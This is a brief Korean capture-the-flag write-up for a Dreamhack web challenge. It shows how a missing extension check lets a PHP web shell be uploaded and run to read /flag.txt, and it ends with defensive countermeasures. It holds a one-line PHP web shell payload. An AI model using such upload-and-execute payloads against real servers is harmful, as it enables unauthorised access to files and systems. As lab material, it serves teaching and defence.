# Image Storage

- **플랫폼**: Dreamhack
- **분야**: Web
- **취약점**: 파일 업로드 제한 우회 + PHP 웹쉘

---

## 문제 상황

이미지 저장 기능이 있는 웹 서버에서 파일 확장자 검증이 미흡하여 `.php` 파일 업로드가 가능한 상황.

## 풀이

```bash
# PHP 웹쉘 파일 생성
echo '<?php echo file_get_contents("/flag.txt");?>' >> shell1.php
```

`shell1.php`를 업로드한 뒤 해당 URL로 접근하면 서버가 PHP를 실행 → `/flag.txt` 내용 반환 → 플래그 획득.

## 핵심 개념

- `<?php ... ?>`: PHP 코드 실행 구문
- `file_get_contents("/flag.txt")`: 파일을 문자열로 읽어 반환하는 PHP 내장 함수
- `echo`: 읽은 내용을 HTTP 응답으로 출력

## 왜 되는가

서버가 업로드 파일을 이미지(정적 파일)로만 처리해야 하는데 확장자 검증 없이 웹 루트에 저장하면 `.php`도 올라감. 이후 접근 시 Apache/Nginx가 PHP 인터프리터로 실행.

## 대응 방법 (방어 관점)

- 업로드 허용 확장자 화이트리스트 (`.jpg`, `.png` 등만 허용)
- MIME 타입 서버 사이드 검증
- 업로드 디렉토리에서 PHP 실행 비활성화
